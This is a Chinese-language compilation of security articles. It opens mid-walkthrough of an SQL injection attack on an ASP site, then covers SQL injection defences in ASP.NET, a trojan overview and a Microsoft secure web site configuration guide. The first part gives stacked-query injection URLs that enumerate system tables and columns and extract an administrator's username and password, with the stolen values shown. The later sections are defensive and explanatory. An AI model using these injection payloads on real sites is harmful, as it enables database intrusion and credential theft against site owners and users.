在查询分析器执行以下SQL语句（以我本地的数据库为例子）
select top 1 name from sysobjects where xtype='u' and status>0
我们马上就可以得到该数据库下用户表的第一个表名gallery （见pic/4.gif）
select top 1 id from sysobjects where xtype='u' and name='gallery'
我们马上就可以得到该数据库下用户表的第一个表名gallery的对象标志2099048（见pic/5.gif）
select top 1 name from sysobjects where xtype='u' and id>2099048
再得到第2个表名gb_data，这里用到的是id>2099048，因为对象标志id是根据由小到大排列的 （见pic/6.gif）
以此类推，我们可以得到所有的用户表的名字了
接下来，我们要根据得到的表名取他的字段名
这里我们用到的是系统自带的2个函数col_name()和object_id()
在查询分析器执行以下SQL语句（以我本地的数据库为例子）
select top 1 col_name(object_id('gallery'),1) from gallery
得到gallery表的第一个字段名为id （见pic/7.gif）
注：
col_name()的语法
COL_NAME ( table_id , column_id )
参数
table_id：包含数据库列的表的标识号。table_id 属于 int 类型。
column_id：列的标识号。column_id 参数属于 int 类型。
其中我们用object_id()函数来得到该表的标识号，1、2、3。。表示该表的第1个、第2个、第3个。。字段的标识号
以此类推得到该表所有的字段名称
三、再次渗透攻击
经过上面2步的热身，接下来我们该利用建立好的平台实际操作演练一下了
依然是那个页，我们提交
http://******/showspecial.asp?Specialid=1817;update[user] set email=(select top 1 name from sysobjects where xtype='u' and status>0) where id=103534;--
服务器返回
ADODB.Recordset 错误 '800a0cb3' 
当前记录集不支持更新。这可能是提供程序的限制，也可能是选定锁定类型的限制。 
/showspecial.asp，行19 
出师不利，可能该页记录集打开方式是只读，我们再换一个页
找到http://******/ShowSinger.asp?Classid=34&SClassid=35的SClassid同样存在问题，于是提交
http://******/ShowSinger.asp?Classid=34&SClassid=35;update [user] set email=(select top 1 name from sysobjects where xtype='u' and status>0) where id=103534;--
把第一个数据表的名字更新到我的资料的email项里去
得到第一个表名为：lmuser （见pic/8.gif）
http://******/ShowSinger.asp?Classid=34&SClassid=35;update [user] set email=(select top 1 id from sysobjects where xtype='u' and name='lmuser') where id=103534;--
得到第一个表lmuser的id标识号为：363148339 （见pic/9.gif）
http://******/ShowSinger.asp?Classid=34&SClassid=35;update [user] set email=(select top 1 name from sysobjects where xtype='u' and id>363148339) where id=103534;--
得到第二个表名为：ad （见pic/10.gif）
这里我们利用的是数据表的对象标志id是升序排列的特点
以此类推继续取。。。。。（由于篇幅问题，中间省略n步）
最后我们得到了所有的表名，发现其中有个表admin，哈，很可能就是管理员的列表了（见pic/11.gif）
好，接下来我们就取该表的字段名
http://******/ShowSinger.asp?Classid=34&SClassid=35;update [user] set email=(select top 1 col_name(object_id('admin'),1) from admin) where id=103534;--
得到第1个字段为：id （见pic/12.gif）
http://******/ShowSinger.asp?Classid=34&SClassid=35;update [user] set email=(select top 1 col_name(object_id('admin'),2) from admin) where id=103534;--
得到第2个字段为：username （见pic/13.gif）
http://******/ShowSinger.asp?Classid=34&SClassid=35;update [user] set email=(select top 1 col_name(object_id('admin'),3) from admin) where id=103534;--
得到第2个字段为：password
到此，管理员列表的3个关键字段已经给我们拿到，接下来要拿用户名和密码就比较省力了
首先拿管理员的id值，这个比较简单，在上期的档案里的“动网论坛有史以来最大的安全漏洞”里详细的方法
我们拿到的id值是44
http://******/ShowSinger.asp?Classid=34&SClassid=35;update [user] set email=(select top 1 username from admin where id=44) where id=103534;--
将该管理员的用户名更新到email项 
拿到的username为：gscdjmp3 （见pic/14.gif）
http://******/ShowSinger.asp?Classid=34&SClassid=35;update [user] set email=(select top 1 password from admin where id=44) where id=103534;--
将该管理员的密码更新到email项 
拿到的password为：XZDC9212CDJ （见pic/15.gif）
怎么样，拿到密码了吧？

四、总结
在我们对一个不知道原代码的有SQL Iinjection漏洞的程序进行注入的时候，往往很难猜到作者设置的数据库结构，只能通过编写程序时的经验来猜几个比较常用的表和字段，这样给注入带来了很多的麻烦，会因为猜不到结构而放弃，这时候大家不妨试试这个方法，或许对你有所帮助，这里我们通过更新我们的一个注册用户的信息来拿到结果，如果是新闻系统的话，可以通过更新到某个新闻的title来拿结果。
最后，值得提出的是，请大家不要拿该方法去恶意攻击其他的程序，谢谢！
ASP.NET中如何防范SQL注入式攻击
一、什么是SQL注入式攻击？ 

　　所谓SQL注入式攻击，就是攻击者把SQL命令插入到Web表单的输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。在某些表单中，用户输入的内容直接用来构造（或者影响）动态SQL命令，或作为存储过程的输入参数，这类表单特别容易受到SQL注入式攻击。常见的SQL注入式攻击过程类如： 
　　⑴ 某个ASP.NET Web应用有一个登录页面，这个登录页面控制着用户是否有权访问应用，它要求用户输入一个名称和密码。 
　　⑵ 登录页面中输入的内容将直接用来构造动态的SQL命令，或者直接用作存储过程的参数。下面是ASP.NET应用构造查询的一个例子： 
　　System.Text.StringBuilder query = new System.Text.StringBuilder(
　　"SELECT * from Users WHERE login = '")
　　.Append(txtLogin.Text).Append("' AND password='")
　　.Append(txtPassword.Text).Append("'");
　　⑶ 攻击者在用户名字和密码输入框中输入"'或'1'='1"之类的内容。 
　　⑷ 用户输入的内容提交给服务器之后，服务器运行上面的ASP.NET代码构造出查询用户的SQL命令，但由于攻击者输入的内容非常特殊，所以最后得到的SQL命令变成：SELECT * from Users WHERE login = '' or '1'='1' AND password = '' or '1'='1'。 
　　⑸ 服务器执行查询或存储过程，将用户输入的身份信息和服务器中保存的身份信息进行对比。 
　　⑹ 由于SQL命令实际上已被注入式攻击修改，已经不能真正验证用户身份，所以系统会错误地授权给攻击者。 
　　如果攻击者知道应用会将表单中输入的内容直接用于验证身份的查询，他就会尝试输入某些特殊的SQL字符串篡改查询改变其原来的功能，欺骗系统授予访问权限。 
　　系统环境不同，攻击者可能造成的损害也不同，这主要由应用访问数据库的安全权限决定。如果用户的帐户具有管理员或其他比较高级的权限，攻击者就可能对数据库的表执行各种他想要做的操作，包括添加、删除或更新数据，甚至可能直接删除表。 
二、如何防范？ 
　　好在要防止ASP.NET应用被SQL注入式攻击闯入并不是一件特别困难的事情，只要在利用表单输入的内容构造SQL命令之前，把所有输入内容过滤一番就可以了。过滤输入内容可以按多种方式进行。 
　　⑴ 对于动态构造SQL查询的场合，可以使用下面的技术： 
　　第一：替换单引号，即把所有单独出现的单引号改成两个单引号，防止攻击者修改SQL命令的含义。再来看前面的例子，“SELECT * from Users WHERE login = ''' or ''1''=''1' AND password = ''' or ''1''=''1'”显然会得到与“SELECT * from Users WHERE login = '' or '1'='1' AND password = '' or '1'='1'”不同的结果。 
　　第二：删除用户输入内容中的所有连字符，防止攻击者构造出类如“SELECT * from Users WHERE login = 'mas' -- AND password =''”之类的查询，因为这类查询的后半部分已经被注释掉，不再有效，攻击者只要知道一个合法的用户登录名称，根本不需要知道用户的密码就可以顺利获得访问权限。 
　　第三：对于用来执行查询的数据库帐户，限制其权限。用不同的用户帐户执行查询、插入、更新、删除操作。由于隔离了不同帐户可执行的操作，因而也就防止了原本用于执行SELECT命令的地方却被用于执行INSERT、UPDATE或DELETE命令。 
　　⑵ 用存储过程来执行所有的查询。SQL参数的传递方式将防止攻击者利用单引号和连字符实施攻击。此外，它还使得数据库权限可以限制到只允许特定的存储过程执行，所有的用户输入必须遵从被调用的存储过程的安全上下文，这样就很难再发生注入式攻击了。 
　　⑶ 限制表单或查询字符串输入的长度。如果用户的登录名字最多只有10个字符，那么不要认可表单中输入的10个以上的字符，这将大大增加攻击者在SQL命令中插入有害代码的难度。 
　　⑷ 检查用户输入的合法性，确信输入的内容只包含合法的数据。数据检查应当在客户端和服务器端都执行——之所以要执行服务器端验证，是为了弥补客户端验证机制脆弱的安全性。 
　　在客户端，攻击者完全有可能获得网页的源代码，修改验证合法性的脚本（或者直接删除脚本），然后将非法内容通过修改后的表单提交给服务器。因此，要保证验证操作确实已经执行，唯一的办法就是在服务器端也执行验证。你可以使用许多内建的验证对象，例如RegularExpressionValidator，它们能够自动生成验证用的客户端脚本，当然你也可以插入服务器端的方法调用。如果找不到现成的验证对象，你可以通过CustomValidator自己创建一个。 
　　⑸ 将用户登录名称、密码等数据加密保存。加密用户输入的数据，然后再将它与数据库中保存的数据比较，这相当于对用户输入的数据进行了“消毒”处理，用户输入的数据不再对数据库有任何特殊的意义，从而也就防止了攻击者注入SQL命令。System.Web.Security.formsAuthentication类有一个HashPasswordForStoringInConfigFile，非常适合于对输入数据进行消毒处理。 
　　⑹ 检查提取数据的查询所返回的记录数量。如果程序只要求返回一个记录，但实际返回的记录却超过一行，那就当作出错处理。
木马综述:木马特征、常见木马入侵手法、木马防范
在我潜意识中说起“木马”马上就联想到三国时期诸葛亮先生发明的木牛流马，当初怎么就想不通它与病毒扯上关系了。经过一番了解，原来它是借用了一个古希腊士兵藏在木马中潜入敌方城市，从而一举占领敌方城市的故事，因为现在所讲的木马病毒侵入远程主机的方式在战略上与其攻城的方式一致。通个这样的解释相信大多数朋友对木马入侵主机的方式所有领悟：它就是通过潜入你的电脑系统，通过种种隐蔽的方式在系统启动时自动在后台执行的程序，以“里应外合”的工作方式，用服务器/客户端的通讯手段，达到当你上网时控制你的电脑，以窃取你的密码、游览你的硬盘资源，修改你的文件或注册表、偷看你的邮件等等。 
　　一旦你的电脑被它控制，则通常表现为蓝屏然死机；CD-ROM莫名其妙地自己弹出；鼠标左右键功能颠倒或者失灵或文件被删除；时而死机，时而又重新启动；在没有执行什么操作的时候，却在拼命读写硬盘；系统莫明其妙地对软驱进行搜索；没有运行大的程序，而系统的速度越来越慢，系统资源占用很多；用CTRL＋ALT＋DEL调出任务表，发现有多个名字相同的程序在运行，而且可能会随时间的增加而增多等等。 
　　不过要知道，即使发现了你的机器染上木马病毒，也不必那么害怕，因为木马病毒与一般病毒在目的上有很大的区别，即使木马运行了，也不一定会对你的机器造成危害。但肯定有坏处，你的上网密码有可能已经跑到别人的收件箱里了，这样黑客们就可以盗用你的上网账号上网了！木马程序也是病毒程序的一类，但更具体的被认为黑客程序，因为它入侵的目的是为发布这些木马程序的人，即所谓的黑客服务的。 
　　本文将就木马的一些特征、木马入侵的一些常用手法以及如何避免木马的入侵各方面作一些综合说明。 
木马是病毒的一种，同时木马程序又有许多种不同的种类，那是受不同的人、不同时期开发来区别的。一般它们都有以下基本特征： 
1、隐蔽性是其首要的特征 
　　如其它所有的病毒一样，木马也是一种病毒，它必需隐藏在你的系统之中，它会想尽一切办法不让你发现它。很多人的对木马和远程控制软件有点分不清，因为我前面讲了木马程序就要通过木马程序驻留目标机器后通过远程控制功能控制目标机器。实际上他们两者的最大区别就是在于这一点，举个例子来说吧，象我们进行局域网间通讯的常软件——PCanywhere大家一定不陌生吧，大家也知道它是一款远程通讯软件。PCanwhere在服务器端运行时，客户端与服务器端连接成功后客户端机上会出现很醒目的提示标志。而木马类的软件的服务器端在运行的时候应用各种手段隐藏自己,不可能还出现什么提示，这些黑客们早就想到了方方面面可能发生的迹象，把它们扼杀了。例如大家所熟悉木马修改注册表和ini文件以便机器在下一次启动后仍能载入木马程式，它不是自己生成一个启动程序，而是依附在其它程序之中。有些把服务器端和正常程序绑定成一个程序的软件,叫做exe-binder绑定程式，可以让人在使用绑定的程式时，木马也入侵了系统，甚至有个别木马程序能把它自身的exe文件和服务器端的图片文件绑定，在你看图片的时候，木马也侵入了你的系统。 它的隐蔽性主要体现在以下两个方面： 
　　a、不产生图标 
　　它虽然在你系统启动时会自动运行，但它不会在“任务栏”中产生一个图标，这是容易理解的，不然的话，凭你的火眼金睛你一定会发现它的。我们知道要想在任务栏中隐藏图标，只需要在木马程序开发时把“form”的“Visible ”属性设置为“False”、把“ShowintaskBar”属性设置为“Flase”即可； 
　　b、木马程序自动在任务管理器中隐藏，并以“系统服务”的方式欺骗操作系统。 
2、它具有自动运行性 
　　它是一个当你系统启动时即自动运行的程序，所以它必需潜入在你的启动配置文件中，如win.ini、system.ini、winstart.bat以及启动组等文件之中。 
3、木马程序具有欺骗性 
　　木马程序要达到其长期隐蔽的目的，就必需借助系统中已有的文件，以防被你发现，它经常使用的是常见的文件名或扩展名，如“dllwinsysexplorer等字样，或者仿制一些不易被人区别的文件名，如字母“l”与数字“1”、字母“o”与数字“0”，常修改基本个文件中的这些难以分辨的字符，更有甚者干脆就借用系统文件中已有的文件名，只不过它保存在不同路径之中。还有的木马程序为了隐藏自己，也常把自己设置成一个ZIP文件式图标，当你一不小心打开它时，它就马上运行。等等这些手段那些编制木马程序的人还在不断地研究、发掘，总之是越来越隐蔽，越来越专业，所以有人称木马程序为“骗子程序”。 
4、具备自动恢复功能 
　　现在很多的木马程序中的功能模块已不再是由单一的文件组成，而是具有多重备份，可以相互恢复。 
5、能自动打开特别的端口 
　　木马程序潜入人的电脑之中的目的不主要为了破坏你的系统，更是为了获取你的系统中有用的信息，这样就必需当你上网时能与远端客户进行通讯，这样木马程序就会用服务器/客户端的通讯手段把信息告诉黑客们，以便黑客们控制你的机器，或实施更加进一步入侵企图。你知不知道你的电脑有多少个对外的“门”，不知道吧，告诉你别吓着，根据TCP/IP协议，每台电脑可以有256乘以256扇门，也即从0到65535号“门，但我们常用的只有少数几个，你想有这么门可以进，还能进不来？当然有门我们还是可以关上它们的，这我在预防木马的办法中将会讲到。 
6、 功能的特殊性 
　　通常的木马的功能都是十分特殊的，除了普通的文件操作以外，还有些木马具有搜索cache中的口令、设置口令、扫描目标机器人的IP地址、进行键盘记录、远程注册表的操作、以及锁定鼠标等功能,上面所讲的远程控制软件的功能当然不会有的，毕竟远程控制软件是用来控制远程机器，方便自己操作而已，而不是用来黑对方的机器的。 
7、黑客组织趋于公开化 
　　以往还从未发现有什么公开化的病毒组织（也许是我孤陋寡闻），多数病毒是由个别人出于好奇（当然也有专门从事这一职业的），想试一下自己的病毒程序开发水平而做的，但他（她）绝对不敢公开，因为一旦发现是有可能被判坐牢或罚款的，这样的例子已不再什么新闻了。如果以前真的也有专门开发病毒的病毒组织，但应绝对是属于“地下”的。现在倒好，什么专门开发木马程序的组织到处都是，不光存在，而且还公开在网上大肆招兵买马，似乎已经合法化。正因如此所以黑客程序不断升级、层出不穷，黑的手段也越来越高明。我不知道为什么，但据讲其理由是“为了自卫、为了爱国” 。 
木马入侵的常用手法 
　　虽然木马程序千变万化，但正如一位木马组织的负责人所讲，大多数木马程序没有特别的功能，入侵的手法也差不多，只是以前有关木马程序的重复，只是改了个名而已，现在他们都要讲究效率，据说他们要杜绝重复开发，浪费资源。当然我们也只能讲讲以前的一些通用入侵手法，因为我们毕竟不是木马的开发者，不可能有先知先觉。 
1、在win.ini文件中加载 
　　一般在win.ini文件中的[windwos]段中有如下加载项： 
run=　　 load= ，一般此两项为空，如图1所示。 

图1 
　　如果你发现你的系统中的此两项加载了任何可疑的程序时，应特别当心，这时可根据其提供的源文件路径和功能进一步检查。我们知道这两项分别是用来当系统启动时自动运行和加载程序的，如果木马程序加载到这两个子项中之后，那么当你的系统启动后即可自动运行或加载了。当然也有可能你的系统之中确是需要加载某一程序，但你要知道这更是木马利用的好机会，它往往会在现有加载的程序文件名之后再加一个它自己的文件名或者参数，这个文件名也往往用你常见的文件，如command.exe、sys.com等来伪装。 
2、在System.ini文件中加载 
　　我们知道在系统信息文件system.ini中也有一个启动加载项，那就是在[BOOT]子项中的“Shell”项，如图2所示。 

图2 
　　在这里木马最惯用的伎俩就是把本应是“Explorer”变成它自己的程序名，名称伪装成几乎与原来的一样，只需稍稍改"Explorer”的字母“l”改为数字“1”，或者把其中的“o”改为数字“0”，这些改变如果不仔细留意是很难被人发现的，这就是我们前面所讲的欺骗性。当然也有的木马不是这样做的，而是直接把“Explorer”改为别的什么名字，因为他知道还是有很多朋友不知道这里就一定是“Explorer”，或者在“Explorer”加上点什么东东，加上的那些东东肯定就是木马程序了。 
3、修改注册表 
　　如果经常研究注册表的朋友一定知道，在注册表中我们也可以设置一些启动加载项目的，编制木马程序的高手们当然不会放过这样的机会的，况且他们知道注册表中更安全，因为会看注册表的人更少。事实上，只要是”RunRun-RunOnceRunOnceEx RunServices RunServices-RunServicesOnce 等都是木马程序加载的入口，如[HKEY_LOCAL_MACHINESOFTWAREMicrosoft WindowsCurrentVersionRun或RunOnce]，如图3所示； 

图3 
　[HKEY_CURRENT_USERSOFTWAREMicrosoftWindowsCurrentVersionRun或Run-或RunOnce或RunOnceEx或RunServices或RunServices-或RunServicesOnce]，如图4所示。 

图4 
　　你只要按照其指定的源文件路径一路查过去，并具体研究一下它在你系统这中的作用就不难发现这些键值的作用了，不过同样要注意木马的欺骗性，它可是最善于伪装自己呵！同时还要仔细观察一下在这些键值项中是否有类似netspy.exe、空格、.exe或其它可疑的文件名，如有则立即删除。 
4、修改文件打开关联 
　　木马程序发展到了今天，他们发现以上的那些老招式不灵了，为了更加隐蔽自己，他们所采用隐蔽的手段也是越来越高明了（不过这也是万物的生存之道，你说呢？），它们采用修改文件打开关联来达到加载的目的，当你打开了一个已修改了打开关联的文件时，木马也就开始了它的运作，如冰河木马就是利用文本文件（.txt）这个最常见，但又最不引人注目的文件格式关联来加载自己，当有人打开文本文件时就自动加载了冰河木马。 
　　修改关联的途经还是选择了注册表的修改，它主要选择的是文件格式中的“打开”、“编辑”、“打印”项目，如冰河木马修改的对象如图5所示， 

图5 
　　如果感染了冰河木马病毒则在[HKEY_CLASSES_ROOTtxtfileshellopencommand]中的键值不是“c:windowsnotepad.exe %1”，而是改为“sysexplr.exe %1”。 
　　以上所介绍的几种木马入侵方式，如果发现了我们当然是立即对其删除，并要立即与网络断开，切断黑客通讯的途径，在以上各种途径中查找，如果是在注册表发现的，则要利用注册表的查找功能全部查找一篇，清除所有的木马隐藏的窝点，做到彻底清除。如果作了注册表备份，最好全部删除注册表后再导入原来的备份注册表。 
　　在清除木马前一定要注意，如果木马正在运行，则你无法删除其程序，这时你可以重启动到DOS方式然后将其删除。有的木马会自动检查其在注册表中的自启动项，如果你是在木马处于活动时删除该项的话它能自动恢复，这时你可以重启到DOS下将其程序删除后再进入Win9x下将其注册表中的自启动项删除。 
如何避免木马的入侵 
　　谈到这个问题，我真有点害怕讲下去，因为我知道我所讲的这些预防办法那些专门研究木马的黑客早就注意了，或许早就想好了对策，但是不管怎样我相信如果注意了以下几个方面多多少少对阻止木马的入侵有些好处的，特别是对那些入门级的木马！在此先要声明，反木马就象反病毒一样永远没有止境，也永远没有一个百分百的解决方案，因为都是先有木马，然后才有我们反木马的方法和软件，我们始终是个追随者！ 
1、 不要执行任何来历不明的软件 
　　对于从网上下载的软件在安装、使用前一定要用多几种反病毒软件，最好是专门查杀木马的软件进行检查，确定无毒了再执行、使用。 
2、不要相信你的邮箱不会收到垃圾和带毒的邮件 
　　永远不要相信你的邮箱就不会收到垃圾和带毒的邮件，即使从没露过面的邮箱或是ISP邮箱，有些时候你永远没办法知道别人如何得知你的mail地址的。 
3、不要轻信他人 
　　不要因为是你的好朋友发来的软件就运行，因为你不能确保他的电脑上就不会有病毒，当然好朋友故意欺骗的可能性不大，但也许他（她）中了黑客程序自己还不知道！同时，网络发展到今天，你也不能保证这一定是你的朋友发给你的，因为别人也可冒名给你发邮件。 
4、不要随便留下你的个人资料 
　　特别不要在聊天室内公开你的Email地址。 因为你永远不会知道是否有人会处心积虑收集起你的资料，以备将来黑你！更不要将重要口令和资料存放在上网的电脑里，以防黑客侵入你的电脑盗走你一切“值钱的东东”。 
5、网上不要得罪人 
　　在聊天时，永远不要以为网络上谁也不认识谁就出言不逊，这样会不小心得罪某些高人，到时找你开刀。 
6、不要随便下载软件 
　　特别是不可靠的小FTP站点、公众新闻级、论坛或BBS上，因为这些地方正是新病毒发布的首选之地。 
7、最好使用第三方邮件程序 
　　如Foxmail等,不要使用Microsoft的Outlook程序，因为Outlook程序的安全漏洞实在太多了，况且Outlook也是那些黑客们首选攻击的对象，已经选好了许多攻击入口； 
8、不要轻易打开广告邮件中附件或点击其中的链接 
　　因为广告邮件也是那些黑客程序依附的重要对象，特别是其中的一些链接。 
9、将windows资源管理器配置成始终显示扩展名 
　　因为一些扩展名为：VBS、SHS、PIF的文件多为木马病毒的特征文件，更有些文件为又扩展名，那更应重点查看，一经发现要立即删除，千万不要打开，只有时时显示了文件的全名才能及时发现。 
10、尽量少用共享文件夹 
　　如果因工作等其它原因必需设置成共享，则最好单独开一个共享文件夹，把所有需共享的文件都放在这个共享文件夹中，注意千万不要系统目录设置成共享！ 
11、给电子邮件加密 
　　为了确保你的邮件不被其它人看到，同时也为了防止黑客们的攻击，向大家推荐一款加密专家——PGP，相信它一定不会让你失望的！ 
12、隐藏IP地址 
　　这一点非常重要！！你上网时最好用一些工具软件隐藏你的电脑的IP地址，如使用ICQ，就进入“ICQMenuSecuri-ty&Privacy”，把“IP Publishing”下面的“Do not Publish IP ad-dress”选项上。 
13、运行反木马实时监控程序 
　　最后，好是最重要的一点就是你在上网时必需运行你的反木马实时监控程序，如、the cleaner， 它的实时监控程序TCA，可即时显示当前所有运行程序并有详细的描述信息，加外如加上一些专业的最新杀毒软件、个人防火墙进行监控那更是放心了，当然这要你的爱机够档次才行，你说呢？ 
如何构建和配置更加安全的Web站点
摘要：由 Microsoft 工程师使用 Microsoft .NET Framework、Microsoft Windows 2000 Advanced Server、Internet 信息服务 5.0 和 Microsoft SQL Server 2000 构建的 Web 站点，在 eWeek OpenHack 4 竞赛中成功顶住了 82,500 多次攻击，并一举胜出。本文介绍此解决方案的构建和配置方法，并为软件开发人员和系统管理员确保自己的解决方案的安全性提供了最佳方案。（本文包含一些指向英文站点的链接。） 
简介 
Web 应用程序 
Internet 信息服务 (IIS) 5.0 
Windows 2000 Advanced Server 操作系统 
IP 安全标准 (IPSec) 策略 
远程管理与监视 
SQL Server 2000 
密码 
小结 
更多信息
简介 
eWeek Labs 举行了第四届年度 OpenHack 联机安全性竞赛。此次年度竞赛（这是 Microsoft? 第三次参加此项赛事）旨在通过将系统暴露在 Web 真实而险恶的环境中来测试企业的安全性。eWeek 向 Microsoft 和 Oracle 提供了 Web 应用程序示例，要求双方使用各自的技术重新开发此应用程序。随后，eWeek 又邀请美国各地的计算机用户破坏最终站点的安全性，成功者可领取一定数额的奖金。可接受的破坏包括跨站点的脚本攻击、动态 Web 页面源代码泄漏、破坏 Web 页面、向数据库发送恶意 SQL 命令以及窃取所用数据库中的信用卡数据。 
Microsoft 使用 Microsoft? .NET Framework 开发其应用程序。Microsoft? .NET Framework 是一个完整的 Windows 组件，支持构建和运行下一代应用程序和 XML Web Service。此应用程序以 Microsoft? Internet 信息服务 (IIS) 5.0 为宿主，并使用 Microsoft? SQL Server? 2000 作为其数据库。所有服务器都运行在 Microsoft? Windows? 2000 Advanced Server 操作系统上。（值得注意的是，如果竞赛时已发布带有 IIS 6.0 的 Microsoft? Windows Server 2003，则当时会使用此版本的操作系统。如果使用 Windows Server 2003，则可以省去竞赛中用于“锁定”操作系统和 Web 服务器的几个步骤。） 
竞赛结果可以在 http://www.eweek.com/category2/1,3960,600431,00.asp 中找到。总而言之，Microsoft 的解决方案顶住了 82,500 多次攻击。正如它在第一届和第二届 OpenHack 竞赛中表现的一样，Microsoft 安然无恙地从 OpenHack 4 竞赛中胜出。本文将对竞赛中使用的各种技术加以介绍，以说明此解决方案的构建和配置方法，并向确保自己的解决方案安全性的开发人员和系统管理员介绍如何应用这些最佳方案。 
Web 应用程序 
此应用程序本身模拟 eWeek eXcellence Awards Web 站点。在此站点中，用户可以登记其公司的产品或服务以参与获奖评选。用户可以设置一个帐户，以输入产品或服务进行评选，可以提交信用卡号支付报名费，还可以获取有关奖项本身的信息。Microsoft 使用 .NET Framework 构建其解决方案，.NET Framework 是一个完整的 Windows 组件，用于构建和运行应用程序及 XML Web Service。大多数开发均围绕 Framework 的 ASP.NET、ADO.NET 和加密类库进行，这三项技术提供的功能分别用于构建基于 Web 的应用程序，访问和使用数据，以及加密、解密和确保数据完整性。 
窗体身份验证 
Microsoft? ASP.NET 类提供了几个用于验证用户身份的选项（即，使用一些凭据，如用户名和密码，来确认给定用户的身份）。这些选项包括集成的 Windows 身份验证、基本身份验证、摘要身份验证、Microsoft? .NET Passport 以及客户证书等。对于每个 eWeek 请求，OpenHack 解决方案选择了基于窗体的或自定义的身份验证。 
当用户通过窗体身份验证登录时，系统将创建一个加密的 cookie，用于在整个站点中跟踪用户。（从技术角度而言，cookie 是一个由 Web 站点生成的纯文本字符串，可进入用户的 Web 浏览器内存，用于对浏览站点的用户进行标识。） 
如果用户在未登录的情况下请求一个安全页面，系统会将此用户重定向到登录页面，所有这些都只需要使用应用程序的基于 XML 的 Web.config 文件进行配置就可以实现。该文件由 Microsoft? Visual Studio? .NET（用于构建基于 .NET Framework 的应用程序的集成开发环境）自动生成，用于存储 ASP.NET Web 应用程序的配置。 
在应用程序的根文件夹中，我们向 Web.config 文件的 部分添加了以下几行代码，以请求基于窗体的身份验证并指定登录页的位置。 
<authentication mode="forms">
<forms loginUrl="Login.aspx" name="OPSAMPLEAPP"/>
</authentication>

此顶层配置文件应用到此应用程序的所有页面。然后，用第二个 Web.config 文件创建子目录。此文件只应用到应用程序中的少数几个选定页面，以防未经身份验证的用户（即匿名用户）对其进行访问。第二个 .config 文件继承了顶层 .config 文件的身份验证信息。 
<?xml version="1.0" encoding="utf-8" ?>
<configuration> 
<system.web>
<authorization>
<deny users="?" />
</authorization>
</system.web>
</configuration>

通过这种方式使用这两个 .config 文件，未经身份验证的用户只能访问主页和其他少数几个页面，而已通过身份验证的用户则还可以访问站点上那些需要用户登录的页面。 
登录页本身包含供用户输入用户名和密码的字段，并通过安全套接字层 (SSL) 将其返回给 Web 服务器，从而防止某些用户“窃取”网络中传递的凭据。用户创建新帐户后，Web 应用程序将使用 Triple DES 算法将新密码加密（详见存储机密信息一节的介绍），并将其与用户名一同存储在数据库中。以后登录时，Web 应用程序将使用 Triple DES 对在登录页输入的密码进行加密，然后与数据库中存储的加密密码进行比较。如果这两个密码匹配，Web 应用程序将使用 ASP.NET 库中的 System.Web.Security.formsAuthentication 类生成一个包含用户的用户名和姓名的加密 cookie。此 cookie 将返回给用户并储存在用户的浏览器中，直到超时为止。用户此后向 Web 站点发送的任何请求都会包含此 cookie。所有涉及 cookie 的传输都使用 SSL 进行，以防“重放”攻击（即攻击者从网络中窃取到 cookie，然后使用它假冒用户进行操作）。强烈建议您通过公共网络发送可用于访问敏感信息的敏感信息或凭据时使用 SSL。 
输入有效性验证 
OpenHack 在应用程序中实现了不同级别、不同类型的有效性验证，以确保代码以外的输入（即用户输入）无法更改应用程序的操作。验证输入有效性是一个关键的最佳安全方案，有助于防止缓存溢出、跨站点的脚本攻击以及其他潜在的在应用程序上下文中执行恶意代码的尝试。提供多层保护（正如此处所做的）是另一个重要的最佳安全方案，称为“层层设防”。做最坏的打算并假定解决方案的一层或多层可能遭到破坏，这往往很重要。 
第一道防线是由 ASP.NET（特别是 RegularExpressionValidator 类和 RequiredFieldValidator 类）提供的有效性验证控制，可确保提供了所需的所有输入，且均为有效数据。只允许使用用于提供所需用户操作的字符，在本例中，字符范围很有限。例如，某些字段只允许输入“[ ,\.0-9a-zA-Z_]*”，即空格、单引号、逗号、句号、字母和数字。其他可用于向 Web 站点发送恶意脚本的字符被禁止使用。 
除文本框以外，本应用程序还通过“查询字符串”接受某些输入，查询字符串是动态 URL 的一部分，包含用于生成页面的参数。通过 System.Text.RegularExpressions.Regex 类提供的功能，用正则表达式对数据进行验证，如下所示： 
Regex isNumber = new Regex("^[0-9]+$");
if(isNumber.Match(inputData) ) {
// 使用它
}
else {
// 丢弃它
}

正则表达式是用于匹配文本模式的字符和语法元素集合。在 OpenHack 应用程序中，它们用于确保查询字符串内容是正确且无恶意的。 
此应用程序中的所有数据访问均通过参数化存储过程完成，这些存储过程是使用 T-SQL 语言开发的，并且根据定义在数据库内运行。将与数据库的交互限制到存储过程，这通常是一个最佳方案。如果不存在存储过程，则 SQL 查询必须由 Web 应用程序动态构造。如果 Web 层遭到破坏，攻击者就可以向数据库查询中插入恶意命令，以检索、更改或删除数据库中存储的数据。使用存储过程，Web 应用程序与数据库的交互操作仅限于通过存储过程发送的几个特定的严格类型参数。每当开发人员使用 .NET Framework 调用存储过程时，系统都会对发送到此存储过程的参数进行检查，以确保它们是存储过程可接受的类型（如整数、8 个字符的字符串等）。这是 Web 层有效性验证上的又一个保护层，可确保所有输入数据格式正确，而且不能自行构造为可操作的 SQL 语句。 
任何数据在返回给用户前均采用 HTML 编码。这只需使用 System.Web.HttpServerUtility 类中的 HtmlEncode 方法即可实现，如下所示。 
SomeLabel.Text = Server.HtmlEncode(username);

HTML 编码有助于防止跨站点的脚本攻击。攻击者一旦破坏了数据库，便可向记录中输入脚本，此脚本随后返回给用户并在浏览器中执行。通过 HTML 编码，大多数脚本命令都自动转换为无害文本。 
存储机密信息 
安全地存储机密信息（如提供数据库登录信息的数据库连接字符串）很重要，这样可以防止攻击者访问并使用这些机密信息来读取、操作数据或重新配置解决方案。由于本解决方案使用了集成的 Windows 身份验证来访问数据库，因此连接字符串的价值对于攻击者来说已经显著降低，这是因为连接字符串只包含服务器的位置和数据库名称，而不包括特定的凭据（如密码）。 
默认情况下，Visual Studio .NET 中的数据库连接向导将把连接字符串作为属性值存储在“内含代码”文件（此文件包含应用程序的核心逻辑，这与提供用户界面定义的文件不同）中。 
这为开发人员访问字符串提供了方便。但是，如果攻击者设法登录到包含源代码和 .config 文件的物理计算机上，便有可能读取连接字符串并用它来访问数据库以进行恶意破坏。 
在生产环境中，通常建议您对连接字符串和任何其他所需的凭据进行妥善地保护。一种保护凭据的方法是 OpenHack 4 中采用的方法：加密连接字符串，将其存储在注册表中，并使用访问控制列表 (ACL) 确保只有系统管理员和 ASPNET 辅助进程（IIS 一节中给出了定义）才能访问注册表项。 
